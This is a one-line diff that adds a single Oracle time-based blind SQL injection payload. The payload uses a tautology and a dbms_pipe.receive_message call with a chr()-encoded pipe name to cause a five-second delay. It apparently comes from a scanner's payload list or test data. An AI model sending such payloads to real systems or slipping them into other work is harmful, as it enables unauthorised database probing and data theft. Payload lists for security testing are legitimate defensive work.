@@ -1,0 +1,1 @@
+1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--
